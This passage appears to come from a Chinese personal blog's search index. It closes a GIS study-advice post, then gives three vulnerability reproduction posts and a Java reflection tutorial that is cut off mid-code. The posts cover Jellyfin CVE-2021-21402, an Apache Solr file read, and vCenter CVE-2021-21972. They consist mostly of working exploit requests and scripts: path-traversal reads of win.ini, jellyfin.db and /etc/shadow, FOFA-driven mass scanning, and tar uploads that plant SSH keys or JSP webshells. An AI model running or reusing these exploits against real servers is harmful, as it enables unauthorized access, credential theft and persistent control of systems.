全国本科生大多数和你都是一样的，除了极个别的“天才”（这个不得不承认，确实有写人对某些东西特别有特长）。就跟大多数人比，即便你身在清华北大，你不读书，你上课睡觉玩手机自甘堕落，你肯定会落后；哪怕你身在再不出名的学校，你付出努力，也会有所成就，如果没有，那就是努力的还不够，如果你使出了一辈子的努力还不够，那就用三辈子的努力！一万小时定律，先去尝试一下。\n5. 多去参加有意义的比赛和活动吧，将来你一定不会后悔。\n\n\n\n### 最后\n\n你选择了GIS，说明你选择了一个很有前景的学科，所以不要有类似这种抱怨的话语，“我们专业什么都学，可是什么都学的不精\"。当你这么想的时候，你可以扪心自问，你所抱怨的那门课程是认认真真听了老师课上讲的东西了吗？课下自己去复习巩固了吗？所以，每一门专业课都要学好，这有助于你在领域内的发展，每一门公共课也不能忽视，这是一门教会你作为一名大学生基本的素养的课。踏踏实实走下去，多去做，少空想，就不会感到迷茫了:muscle:。\n\n而且石家庄学院的GIS真的是一步步的在变强大，这个简单回顾一下这短短的几年就能看出，这也多亏了咱们这些在背后付出的老师们，是他们撑起了石家庄学院GIS的一片天。\n\n另外大家课下时间如果在追剧（别说你不追剧哦~:wink:）的话，可以看一看《觉醒年代》这部剧，希望它能给我们这些当代青年学子一些有意义的东西。\n\n勿忘初心，砥砺前行。在前进的路上，要保持一颗初心很难，希望我们都能守护最初的那个梦想！\n\n\n\n### 附件\n\n下面的链接是当时参加比赛之后写的参赛体会：http://image.xpshuai.cn/%E8%96%9B%E5%BD%AD%E5%B8%85%E5%8F%82%E8%B5%9B%E4%BD%93%E4%BC%9A.docx\n\n\n\n![开幕式](http://image.xpshuai.cn/%E5%BC%80%E5%B9%95%E5%BC%8F.png)\n\n\n\n![师生留念](http://image.xpshuai.cn/%E6%AF%94%E8%B5%9B%E5%90%88%E7%85%A7.png)"},{"title":"Jellyfin任意文件读取漏洞复现(CVE-2021-21402)","url":"%2Fposts%2F36974%2F","content":"\n\n\n\n\n### 影响版本：\n\nJellyfin<10.7.1\n\n\n\n## 复现\n\n### fofa语法\n\n```bash\ntitle=\"Jellyfin\"\n```\n\n\n\n### POC\n\n```bash\n# poc_1\nGET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\nHost:xxx.xxx.xxx.xxx\nContent-Type: application/octet-stream\n\n\n# poc_2\nGET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1\nHost: x.x.x.x:5577\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nAccept: */*\nReferer: http://110.93.247.208:5577/web/index.html\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n\n# poc_3\nGET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1\nHost: xxx.xx.xx.xx.xx\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nAccept: */*\nReferer: http://110.93.247.208:5577/web/index.html\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n\n# 其他poc\nGET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1\nGET /Images/Ratings/c:%5ctemp/filename HTTP/1.1\nGET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1\n```\n\n\n\n\n\n\n\n\n\n#### 批量检测脚本\n\n```python\n\nimport requests\nimport os\nfrom urllib.parse import quote\nfrom requests.sessions import session\nos.system('')\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n# 禁用安全请求警告\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\nimport argparse\n\nclass poc():\n    def title(self):\n        print('''\n+-----------------------------------------------------------------+\n漏洞名称:CVE-2021-21402 Jellyfin任意文件读取  \n功能：单个检测，批量检测                                     \n单个检测：python poc.py -u url\n批量检测：python poc.py -f 1.txt\n+-----------------------------------------------------------------+                                     \n''')\n    def exp(self, target_url, session):\n        payload=input('请输入任意路径,默认请回车(例如：..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini)：') or '..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini'\n        url = f\"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/\"\n        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}\n        try:\n            res = session.get(url=url,\n                                headers=headers,\n                                verify=False,\n                                timeout=10)\n            return res\n        except Exception as e:\n            print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\n    def poc(self, target_url, session):\n        payload='..\\data\\jellyfin.db'\n        url = f\"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/\"\n        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}\n        try:\n            res = session.get(url=url,\n                                headers=headers,\n                                verify=False,\n                                timeout=10)\n            return res\n        except Exception as e:\n            print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\n    def main(self, target_url, file):\n        self.title()\n        count=0\n        if target_url:\n            session = requests.session()\n            res=self.exp(target_url, session)\n            if res.status_code==200 and res.text is not None:\n                print(f'文件内容：{res.text}')\n        if file:\n            for url in file:\n                count += 1\n                target_url = url.replace('\\n', '')  #取消换行符\n                session = requests.session()\n                res=self.poc(target_url, session)\n                try:\n                    if res.status_code==200 and res.text is not None:\n                        print(f'\\033[31m[{count}] {target_url} 可能存在漏洞\\033[0m')\n                    else:\n                        print(f'[{count}] {target_url} 不存在漏洞')\n                except Exception as e:\n                    print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-u',\n                        '--url',\n                        type=str,\n                        default=False,\n                        help=\"目标地址，带上http://\")\n    parser.add_argument(\"-f\",\n                        '--file',\n                        type=argparse.FileType('r'),\n                        default=False,\n                        help=\"批量检测，带上http://\")\n    args = parser.parse_args()\n    run = poc()\n    run.main(args.url, args.file)\n\n```\n\n\n\n## 修复建议：\n\n- 更新版本。\n- 在Web应用防火墙上添加防护规则。","tags":["Jellyfin"],"categories":["渗透测试"]},{"title":"Apache Solr SSRF与任意文件读取漏洞","url":"%2Fposts%2F7700%2F","content":"\n\n\n# 前言\n\nApache Solr是一个开源的搜索服务，使用Java语言开发，基于Lucene的全文搜索服务器。\n\nApache Solr全版本存在一个SSRF与任意文件读取漏洞，因Apache Solr整体默认安装为未授权，且大部分资产都为未授权，提供众多api接口，支持未授权用户通过config api更改配置文件，攻击面较大。建议相关用户及时采取措施阻止攻击。\n\n\n\n# 影响范围\n\nApache Solr 所有版本\n\n\n\n\n\n# 漏洞复现\n\n**fofa查询资产关键字：**\n\n```\napp=\"APACHE-Solr\"\n```\n\n\n\n**1.首先访问目标url拼接下面的路径，获取实例对象的名称**\n\n```bash\n/solr/admin/cores?indexInfo=false&wt=json\n```\n\n\n\n![获取实例名称](http://image.xpshuai.cn/solr_instance.png)\n\n如图，可以得到实例对象的名称为`Tourist-guide-Server`\n\n\n\n\n\n**2.构造路径**\n\n```bash\n/solr/\".iii.\"/debug/dump?param=ContentStreams&wt=json\n```\n\n其中`iii`就是我们前面得到的实例对象的名称\n这里，我们构造之后为下面这个(这个地址作为post请求的地址)：\n\n```bash\n/solr/Tourist-guide-Server/debug/dump?param=ContentStreams&wt=json\n```\n\n\n\n而post数据中的body的内容为：`stream.url=file:///etc/passwd`\n\n即(**发送这个数据包**)：\n\n```bash\nPOST /solr/Tourist-guide-Server/debug/dump?param=ContentStreams&wt=json HTTP/1.1\nHost: IP:PORT\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\n\nstream.url=file:///etc/shadow\n```\n\n\n\n![读取文件](http://image.xpshuai.cn/solr_ok.png)\n\n\n\n\n\n\n\n# 漏洞分析\n\n略\n\n\n\n\n\n# EXP\n\n```python\n#!/usr/bin/env python3\n# -*- coding:utf-8 -*-\nimport requests\nimport json\nimport urllib\nimport time\nimport re\ndef Getins(url):\n    try:\n        ins=\"\"\n        url = url+\"solr/admin/cores?indexInfo=false&wt=json\"\n        response = requests.get(url=url)\n        data = str(response.text)\n        ins = re.findall(r'\\\"name\\\":\\\"(.+?)\\\",',data)[0]\n        return(ins)\n    except IndexError:\n        return(\"\")\n\ndef Getfile(url,ins,filename):\n    try:\n        url = url+\"solr/\"+ins+\"/debug/dump?param=ContentStreams&wt=json\"\n        headers ={\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n        payload = str(\"stream.url=file://\"+filename)\n        response = requests.post(url=url,headers=headers,data=payload)\n        data = str(response.text)\n        test = re.findall(r'\\\"stream\\\":\\\"(.+?)\\\"\\}]',data)[0]\n        print(test.replace(r\"\\n\",\"\\n\"))\n    except IndexError:\n        print(\"不能读取此文件\")\n        \n\nif __name__ == '__main__':\n    url = input(\"请输入测试地址:\")\n    filename = input(\"请输入读取的文件路径:\")\n    ins=Getins(url)\n    if(ins == \"\"):\n        print(\"不存在漏洞\")\n    else:\n        Getfile(url,ins,filename)\n```\n\n读取效果：\n\n![exp效果](http://image.xpshuai.cn/solrexp.png)","tags":["Solr"],"categories":["渗透测试"]},{"title":"CVE-2021-21972 vSphere Client RCE复现","url":"%2Fposts%2F58955%2F","content":"\n## 简介\n\nvSphere 是 VMware 推出的虚拟化平台套件，包含 ESXi、vCenter Server 等一系列的软件。其中 vCenter Server 为 ESXi 的控制中心，可从单一控制点统一管理数据中心的所有 vSphere 主机和虚拟机。\n\nvSphere Client（HTML5） 在 vCenter Server 插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，写入webshell，控制服务器。\n\n\n\n\n\n## 影响范围\n\n- `vmware:vcenter_server` 7.0 U1c 之前的 7.0 版本\n- `vmware:vcenter_server` 6.7 U3l 之前的 6.7 版本\n- `vmware:vcenter_server` 6.5 U3n 之前的 6.5 版本\n\n\n\n\n\n## 漏洞分析\n\n我太菜了，还是搬运一下大佬的分析吧：\n\nhttp://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi\n\n...此处省略一万字...\n\n直接将tar解压的文件名与`/tmp/unicorn_ova_dir`拼接并写入文件，这里可以使用`../`绕过目录限制。\n\n**若目标为Linux环境**，可以创建一个文件名为`../../home/vsphere-ui/.ssh/authorized_keys`的tar文件，上传后即可使用SSH连接服务器。\n\n\n\n\n\n\n\n\n\n## POC\n\n>https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py\n\n\n\n该poc主要就是通过以下路径来进行判断, 如果返回405则表示该漏洞存在：\n\n```\n/ui/vropspluginui/rest/services/uploadova\n```\n\nPOC代码如下：\n\n```python\n#!/usr/bin/python3\n# -*- coding=utf-8 -*-\n#-*- coding:utf-8 -*-\nbanner = \"\"\"\n        888888ba             dP                     \n        88    `8b            88                     \n       a88aaaa8P' .d8888b. d8888P .d8888b. dP    dP \n        88   `8b. 88'  `88   88   Y8ooooo. 88    88 \n        88    .88 88.  .88   88         88 88.  .88 \n        88888888P `88888P8   dP   `88888P' `88888P' \n   ooooooooooooooooooooooooooooooooooooooooooooooooooooo \n                @time:2021/02/24 CVE-2021-21972.py\n                C0de by NebulabdSec - @batsu                  \n \"\"\"\nprint(banner)\n\nimport threadpool\nimport random\nimport requests\nimport argparse\nimport http.client\nimport urllib3\nimport socket\nimport socks\n\nsocks.set_default_proxy(socks.SOCKS5, \"127.0.0.1\", 1080)\nsocket.socket = socks.socksocket\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\nhttp.client.HTTPConnection._http_vsn = 10\nhttp.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'\n\nTARGET_URI = \"/ui/vropspluginui/rest/services/uploadova\"\n\n\ndef get_ua():\n    first_num = random.randint(55, 62)\n    third_num = random.randint(0, 3200)\n    fourth_num = random.randint(0, 140)\n    os_type = [\n        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)', '(X11; Linux x86_64)',\n        '(Macintosh; Intel Mac OS X 10_12_6)'\n    ]\n    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)\n\n    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',\n                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']\n                  )\n    return ua\n\n\ndef CVE_2021_21972(url):\n    # proxies = {\"scoks5\": \"http://127.0.0.1:1080\"}\n    headers = {\n        'User-Agent': get_ua(),\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n    targetUrl = url + TARGET_URI\n    try:\n        res = requests.get(targetUrl,\n                            headers=headers,\n                            timeout=15,\n                            verify=False)\n                            # proxies=proxies)\n                            # proxies={'socks5': 'http://127.0.0.1:1081'})\n        # print(len(res.text))\n        if res.status_code == 405:\n            print(\"[+] URL:{}--------存在CVE-2021-21972漏洞\".format(url))\n            # print(\"[+] Command success result: \" + res.text + \"\\n\")\n            with open(\"存在vmware漏洞地址.txt\", 'a+') as fw:\n                fw.write(url + '\\n')\n        else:\n            print(\"[-] \" + url + \" 没有发现CVE-2021-21972漏洞.\\n\")\n    # except Exception as e:\n    #     print(e)\n    except:\n        print(\"[-] \" + url + \" Request ERROR.\\n\")\n\n\ndef multithreading(filename, pools=5):\n    works = []\n    with open(filename, \"r\") as f:\n        for i in f:\n            func_params = [i.rstrip(\"\\n\")]\n            # func_params = [i] + [cmd]\n            works.append((func_params, None))\n    pool = threadpool.ThreadPool(pools)\n    reqs = threadpool.makeRequests(CVE_2021_21972, works)\n    [pool.putRequest(req) for req in reqs]\n    pool.wait()\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-u\",\n                        \"--url\",\n                        help=\"Target URL; Example:http://ip:port\")\n    parser.add_argument(\"-f\",\n                        \"--file\",\n                        help=\"Url File; Example:url.txt\")\n    # parser.add_argument(\"-c\", \"--cmd\", help=\"Commands to be executed; \")\n    args = parser.parse_args()\n    url = args.url\n    # cmd = args.cmd\n    file_path = args.file\n    if url != None and file_path ==None:\n        CVE_2021_21972(url)\n    elif url == None and file_path != None:\n        multithreading(file_path, 10)  # 默认15线程\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n\n\n\n\n## EXP\n\n>https://blog.csdn.net/weixin_43650289/article/details/114055417\n\n```python\nimport tarfile\nimport os\nfrom io import BytesIO\nimport requests\n\nproxies = {\n  \"http\": \"http://127.0.0.1:8080\",\n  \"https\": \"http://127.0.0.1:8080\",\n}\ndef return_zip():\n    with tarfile.open(\"test.tar\", 'w') as tar:\n        payload = BytesIO()\n        id_rsa_pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwgGuwNdSGHKvzHsHt7QImwwJ08Wa/+gHXOt+VwZTD23rLwCGVeYmfKObDY0uFfe2O4jr+sPamgA8As4LwdqtkadBPR+EzZB+PlS66RcVnUnDU4UdMhQjhyj/uv3pdtugugJpB9xaLdrUWwGoOLYA/djxD5hmojGdoYydBezsNhj2xXRyaoq3AZVqh1YLlhpwKnzhodk12a7/7EU+6Zj/ee5jktEwkBsVsDLTTWPpSnzK7r+kAHkbYx8fvO3Fk+9jlwadgbmhHJrpPr8gLEhwvrEnPcK1/j+QXvVkgy2cuYxl9GCUPv2wgZCN50f3wQlaJiektm2S9WkN5dLDdX+X4w=='\n        # 针对Linux有效的方式\n        tarinfo = tarfile.TarInfo(name='../../../home/vsphere-ui/.ssh/authorized_keys')\n        # Windows 需要改一下\n        #tarinfo = tarfile.TarInfo(name=\"..\\\\..\\\\ProgramData\\\\VMware\\\\vCenterServer\\\\data\\\\perfcharts\\\\tc-instance\\\\webapps\\\\statsreport\\\\test.jsp\")\n\n        f1 = BytesIO(id_rsa_pub.encode())\n        tarinfo.size = len(f1.read())\n        f1.seek(0)\n        tar.addfile(tarinfo, fileobj=f1)\n        tar.close()\n        payload.seek(0)\ndef getshell(url):\n    files = {'uploadFile':open('test.tar','rb')}\n    try:\n        r = requests.post(url=url, files=files,proxies=proxies,verify = False).text\n        print(r)\n        # windows下：\n        #         print('shell地址:/statsreport/test.jsp')\n    except:\n        print('flase')\n\nif __name__ == \"__main__\":\n    try:\n        return_zip()\n        url=\"https://192.168.1.1/ui/vropspluginui/rest/services/uploadova\"\n        getshell(url)\n    except IOError as e:\n        raise e\n```\n\n\n\n整合的POC&EXP\n\n```python\nimport requests\nimport tarfile\nimport sys\nimport getopt\nrequests.packages.urllib3.disable_warnings()\n\n\nproxy = {}\n\ndef poc(target):\n\turl = (target + '/ui/vropspluginui/rest/services/uploadova').replace('//ui', '/ui')\n\tweb = requests.get(url,verify=False,proxies=proxy)\n\tif web.status_code == 405:\n\t\treturn True\n\telse:\n\t\treturn False\n\ndef payload_linux(filename, payload_type):\n\tpayload_path = '../../home/vsphere-ui/.ssh/authorized_keys' if payload_type=='ssh' else '../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/test.jsp'\n\tpayload_tar = tarfile.open('payload_linux.tar','w')\n\tfor i in range(106):\n\t\tpayload_tar.add(filename, arcname=payload_path % i)\n\tpayload_tar.close()\n\ndef payload_win(filename):\n\tpayload_path = '../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/test.jsp'\n\tpayload_tar = tarfile.open('payload_win.tar','w')\n\tpayload_tar.add(filename, arcname=payload_path)\n\tpayload_tar.close()\n\n\ndef send_payload(target, payload_type):\n\turl = (target + '/ui/vropspluginui/rest/services/uploadova').replace('//ui', '/ui')\n\tfiles = {'uploadFile': ('1.tar', open('payload_linux.tar', 'rb'), 'application/octet-stream')}\n\tweb = requests.post(url, files=files,verify=False,proxies=proxy)\n\tif web.status_code == 200:\n\t\tif web.text == 'SUCCESS':\n\t\t\tif payload_type == 'ssh':\n\t\t\t\tprint('\\t文件写入成功')\n\t\tif payload_type != 'ssh':\n\t\t\twebshell = (target + '/ui/resources/test.jsp').replace('//ui', '/ui')\n\t\t\tweb = requests.get(webshell,verify=False,proxies=proxy)\n\t\t\tif web.status_code != 404:\n\t\t\t\tprint('\\twebshell地址：%s' % webshell)\n\t\t\t\treturn True\n\tfiles = {'uploadFile': ('1.tar', open('payload_win.tar', 'rb'), 'application/octet-stream')}\n\tweb = requests.post(url, files=files,verify=False,proxies=proxy)\n\tif web.status_code == 200:\n\t\tif web.text == 'SUCCESS':\n\t\t\tprint('\\t文件写入成功')\n\t\t\twebshell = (target + '/statsreport/test.jsp').replace('//statsreport', '/statsreport')\n\t\t\tweb = requests.get(webshell,verify=False,proxies=proxy)\n\t\t\tif web.status_code != 404:\n\t\t\t\tprint('\\twebshell地址：%s' % webshell)\n\t\t\t\twith open(\"webshell地址.txt\", \"a+\") as fff:\n\t\t\t\t\tfff.write('webshell地址：%s \\n' % webshell)\n\t\t\t\treturn True\n\treturn False\n\ndef help():\n\tprint(\n\t\"\"\"\n\tUsage:CVE-2021-21972.py [option]\n\t-u or --url：目标url\n\t-t or --type：攻击方式（ssh/webshell)\n\t-f or --file：要上传的文件（webshell或authorized_keys）\t例如：CVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp\n\t-p or --proxy：设置代理\t例如：CVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp -p http://127.0.0.1:8080\n\t-l or --list：批量检测\t例如：CVE-2021-21972.py -l list.txt -t webshell -f shell.jsp\n\t\"\"\"\n    )\n\nif __name__ == \"__main__\":\n\tif len(sys.argv) == 1:\n\t\thelp()\n\t\tsys.exit()\n\n\ttry:\n\t\topts, args = getopt.getopt(sys.argv[1:], \"l:u:t:f:p:\")\n\texcept getopt.GetoptError:\n\t\tprint(\"argv error,please input\")\n\ttargets = []\n\tpayload_type = ''\n\tfilename = ''\n\tfor opt, arg in opts:\n\t\tif opt in ('-p', '--proxy'):\n\t\t\tproxy = {arg[:arg.find(':')]: arg}\n\tfor opt, arg in opts:\n\t\tif opt in ('-l', '--list'):\n\t\t\twith open(arg, 'r') as t:\n\t\t\t\tfor u in t.read().split('\\n'):\n\t\t\t\t\ttargets.append(u)\n\t\telif opt in ('-u', '--url'):\n\t\t\ttargets.append(arg)\n\tfor opt, arg in opts:\n\t\tif opt in ('-t', '--type'):\n\t\t\tpayload_type = arg\n\tfor opt, arg in opts:\n\t\tif opt in ('-f', '--file'):\n\t\t\tfilename = arg\n\tpayload_linux(filename, payload_type)\n\tif payload_type != 'ssh':\n\t\tpayload_win(filename)\n\tfor target in targets:\n\t\tprint('-' * 50)\n\t\tprint('正在检测%s...' % target)\n\t\tif poc(target):\n\t\t\tif send_payload(target, payload_type):\n\t\t\t\tcontinue\n\t\tprint('Failed')\n\n```\n\n\n\n\n\n\n\n\n\n## 漏洞复现\n\n1.fofa搜索`title=\"+ ID_VC_Welcome +\"`\n\n可以用批量脚本通过fofa把所有搜索到的资产下载到本地\n\n![](http://image.xpshuai.cn/vmware_vul1.jpg)\n\n2.然后使用POC验证漏洞：\n\n![](http://image.xpshuai.cn/vmware_vul2.jpg)\n\n\n\n3.1 添加一个vsphere-ui用户：\n\n```bash\nadduser vsphere-ui\n```\n\n\n\n3.2 生成 ssh密钥\n\n```bash\nssh-keygen -t rsa\n# 然后复制公钥到上面的EXP中去\n```\n\n\n\n3.对于存在漏洞的资产，使用EXP上传tar文件\n\n![](http://image.xpshuai.cn/vmware_vul3.jpg)\n\n成功上传`authorized_keys`\n\n\n\n4.ssh连接\n\n\n\n> 也可以通过上传jsp小马等方式进行利用\n\n\n\n\n\n\n\n\n\n## 漏洞修复\n\n- vCenter Server7.0版本升级到7.0.U1c\n- vCenter Server6.7版本升级到6.7.U3l\n- vCenter Server6.5版本升级到6.5 U3n\n\n\n\n\n\n## 参考\n\nhttps://www.vmware.com/security/advisories/VMSA-2021-0002.html\n\nhttps://www.cnblogs.com/cHr1s/p/14445759.html\n\nhttp://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi/","tags":["vCenter 6.5-7.0 RCE"],"categories":["渗透测试"]},{"title":"Java学习之反射初探","url":"%2Fposts%2F33171%2F","content":"\n### Java反射机制概述\n\n- Reflection（反射）是被视为**动态语言**的关键，反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。\n- 加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个Class对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。**这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为: 反射。**\n\n\n\n![Java反射概述](http://image.xpshuai.cn/Java%E5%8F%8D%E5%B0%84%E6%A6%82%E8%BF%B0.png)\n\n\n\n![动态vs静态语言](http://image.xpshuai.cn/%E5%8A%A8%E6%80%81vs%E9%9D%99%E6%80%81%E8%AF%AD%E8%A8%80.png)\n\n有了反射，就有了Java动态的特性\n\n\n\n\n\n**Java反射机制提供的功能：**\n\n- 在运行时判断任意一个对象所属的类\n- 在运行时构造任意一个类的对象\n- 在运行时判断任意一个类所具有的成员变量和方法\n- 在运行时获取泛型信息\n- 在运行时调用任意一个对象的成员变量和方法\n- 在运行时处理注解\n- 生成动态代理\n  \n  \n\n\n\n**反射相关的主要API；**\n\n- java.lang.Class:代表一个类\n- java.lang.reflect.Method:代表类的方法\n- java.lang.reflect.Field:代表类的成员变量\n- java.lang.reflect.Constructor:代表类的构造器\n- ......\n\n\n\n反射代码：\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-04 22:38\n * @功能：\n *\n * 总结：公开的代码都不安全\n *\n *疑问： 通过直接new对象的方式或反射的方式都可疑调用公共的结构，开发中到底用哪个？\n * 建议用new的方法\n * 什么时候会使用反射的方式。反射的特征:动态性\n *\n * 疑问：反射机制与面向对象中的封装性是不是矛盾的呢？\n *不矛盾，封装性是建议你调不调；反射解决的是能不能调\n *\n *\n */\npublic class ReflectionTest {\n    //反射之前，对于Person类的操作\n    @Test\n    public void test(){\n        //1.实例化类对象\n        Person p1 = new Person(\"tom\", 12);\n        //2.可以通过对象，调用内部属性、方法\n        p1.age = 10;\n        System.out.println(p1);\n        p1.setAge(11);\n        System.out.println(p1);\n        p1.show();\n\n        //在 Person类外部，不可以通过Person类的对象调用其内部私有结构(比如私有属性、私有方法、私有构造器等)。\n\n\n    }\n\n\n    /*\n    反射之后，对于Person的操作\n     */\n    @Test\n    public void test1() throws Exception {\n        Class clazz = Person.class;\n        //1.通过反射创建了Person类的对象\n        Constructor cons = clazz.getConstructor(String.class, int.class);\n        Object obj = cons.newInstance(\"Tom\", 12); //造了个对象, 多态的形式\n        Person p = (Person)obj; //知道类型的话可以强转\n        System.out.println(p.toString()); //\n\n\n        //2.通过反射，调用对象指定的属性、方法\n        //调属性\n        Field age = clazz.getDeclaredField(\"age\");\n        age.set(p, 18);\n        System.out.println(p.toString());\n        //调用方法\n        Method show = clazz.getDeclaredMethod(\"show\");\n        show.invoke(p);  //调用\n\n        System.out.println(\"*******************\");\n        //通过反射，可以调用Person类(运行时类)的私有结构（私有方法、私有属性、私有构造器）\n        //调用私有构造器\n        Constructor cons1 = clazz.getDeclaredConstructor(String.class);\n        cons1.setAccessible(true);\n        Person p1 = (Person) cons1.newInstance(\"Jerry\");\n        System.out.println(p1);\n\n        //调用私有属性\n        Field name = clazz.getDeclaredField(\"name\");\n        name.setAccessible(true);\n        name.set(p1, \"hanmeimei\");\n        System.out.println(p1);\n\n        //调用私有方法\n        Method na = clazz.getDeclaredMethod(\"showNation\", String.class); //方法名，咱叔\n        na.setAccessible(true);\n//        na.invoke(p1, \"China\"); //调用\n        String nation = (String) na.invoke(p1, \"China\"); //接收返回值。调用, 相当于p1.show(\"China\")\n        System.out.println(nation);\n\n    }\n\n\n    @Test\n    public void test2(){\n\n    }\n\n\n    @Test\n    public void test3(){\n\n    }\n}\n\n\n```\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-02-04 22:38\n * @功能：\n */\npublic class Person {\n    private String name;\n    public int age;\n\n    public Person() {\n    }\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    private Person(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public void show(){\n        System.out.println(\"show方法\");\n    }\n\n    private String showNation(String nation){\n        System.out.println(\"我的国籍是：\" + nation);\n        return nation;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n\n```\n\n\n\n\n\n### 理解Class类并<font color=red>获取Class实例</font>\n\n#### 对Class类的理解\n\n```java\n * 关于java.lang.Class的理解：\n *  Class clazz = Person.class;  -->反射的源头\n *  1.类的加载过程\n *  程序经过javac.exe命令以后，会生成一个或多个字节码文件(.class结尾)，\n *  接着我们使用java.exe命令对某个字节码文件进行解释运行。相当于将某个字节码文件加载到内存中，此过程就成为类的加载。\n *  加载到内存中的类，我们就称为运行时类，此运行时类，就作为Class的一个实例\n *  （类本身也是对象，是Class的对象 ）\n *  换句话说，Class的实例就对应着一个运行时类\n *  加载搭配内存中的运行时类，会缓存一定的时间，在此时间之内，我们可以通过不同的方式\n    来获取此运行时类\n * \n *\n *\n *\n * --- 万事万物皆对象：对象.xxx, File, URK, 反射, 前端, 数据库操作\n```\n\n\n\n#### 获取Class实例的4种方式\n\n```java\n    /*\n     * 关于java.lang.Class的理解：\n     *  Class clazz = Person.class;  -->反射的源头\n     *  1.类的加载过程\n     *  程序经过javac.exe命令以后，会生成一个或多个字节码文件(.class结尾)，\n     *  接着我们使用java.exe命令对某个字节码文件进行解释运行。相当于将某个字节码文件加载到内存中，此过程就成为类的加载。\n     *  加载到内存中的类，我们就称为运行时类，此运行时类，就作为Class的一个实例\n     *  （类本身也是对象，是Class的对象 ）\n     *  换句话说，Class的实例就对应着一个运行时类\n     * 加载搭配内存中的运行时类，会缓存一定的时间，在此时间之内，我们可以通过不同的方式\n     * 来获取此运行时类\n     *\n     * --- 万事万物皆对象：对象.xxx, File, URK, 反射, 前端, 数据库操作\n     *\n     *\n     * 获取Class实例的4种方式，如下（前三种方式需要掌握）\n     */\n    @Test\n    public void test2() throws ClassNotFoundException {\n        //方式1：调用运行时类的属性: .class\n        Class<Person> clazz = Person.class;   //加上泛型\n        System.out.println(clazz);\n\n        //方式2：通过运行时类的对象.调用getClass()\n        Person p1 = new Person();\n        Class clazz2 = p1.getClass();\n\n        